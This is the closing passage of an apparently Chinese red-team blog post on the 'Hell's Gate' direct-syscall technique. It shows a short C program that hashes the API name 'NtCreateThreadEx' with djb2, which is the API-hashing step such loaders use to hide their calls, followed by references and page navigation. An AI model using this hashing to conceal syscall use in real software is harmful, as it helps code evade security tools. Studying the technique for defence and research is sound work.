+<h5 id="注-djb2算法代码"><a href="#注-djb2算法代码" class="headerlink" title="注:djb2算法代码"></a>注:djb2算法代码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD64 <span class="title">djb2</span><span class="params">(PBYTE str)</span> </span>&#123;</span><br><span class="line">	DWORD64 dwHash = <span class="number">0x7734773477347734</span>;</span><br><span class="line">	INT c;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (c = *str++)</span><br><span class="line">		dwHash = ((dwHash &lt;&lt; <span class="number">0x5</span>) + dwHash) + c;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> dwHash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	DWORD64 hash = <span class="built_in">djb2</span>((PBYTE)<span class="string">&quot;NtCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;0x%llx\r\n&quot;</span>, hash);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-参考总结"><a href="#4-参考总结" class="headerlink" title="4.参考总结"></a>4.参考总结</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.crisprx.top/archives/540</span><br><span class="line">https://www.anquanke.com/post/id/261582</span><br><span class="line">https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" rel="tag"># 红队渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/01/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/" rel="prev" title="CVE-2021-42287/CVE-2021-42278分析复现">
+      <i class="fa fa-chevron-left"></i> CVE-2021-42287/CVE-2021-42278分析复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/10/30/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay/" rel="next" title="通过WebDav进行NTLM Relay">
+      通过WebDav进行NTLM Relay <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">1.前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">2.前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-PEB%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 PEB的数据结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-%E5%AF%B9%E8%BF%9B%E7%A8%8B%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8C%E9%81%8D%E5%8E%86"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 对进程模块进行遍历</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-1-%E6%89%8B%E5%B7%A5%E9%81%8D%E5%8E%86"><span class="nav-number">2.2.1.</span> <span class="nav-text">2.1.1 手工遍历</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-2-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%93%8D%E4%BD%9C"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.1.2 自动化操作</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-%E9%81%8D%E5%8E%86%E6%A8%A1%E5%9D%97%E4%B8%AD%E7%9A%84%E5%AF%BC%E5%87%BA%E8%A1%A8"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 遍历模块中的导出表</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%9C%B0%E7%8B%B1%E4%B9%8B%E9%97%A8"><span class="nav-number">3.</span> <span class="nav-text">3.地狱之门</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%9C%B0%E7%8B%B1%E4%B9%8B%E9%97%A8%EF%BC%9F"><span class="nav-number">3.0.1.</span> <span class="nav-text">3.1 什么是地狱之门？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-number">3.0.2.</span> <span class="nav-text">3.2 代码实现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%A8-djb2%E7%AE%97%E6%B3%95%E4%BB%A3%E7%A0%81"><span class="nav-number">3.0.3.</span> <span class="nav-text">注:djb2算法代码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%8F%82%E8%80%83%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">4.参考总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Nayon"
+      src="/images/Nayon.png">
+  <p class="site-author-name" itemprop="name">Nayon</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://0range-x.github.io/" title="https:&#x2F;&#x2F;0range-x.github.io&#x2F;" rel="noopener" target="_blank">0r@nge</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://txluck.github.io/" title="https:&#x2F;&#x2F;txluck.github.io&#x2F;" rel="noopener" target="_blank">永安寺</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://odyline.github.io/" title="https:&#x2F;&#x2F;odyline.github.io&#x2F;" rel="noopener" target="_blank">Odyline</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Nayon</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
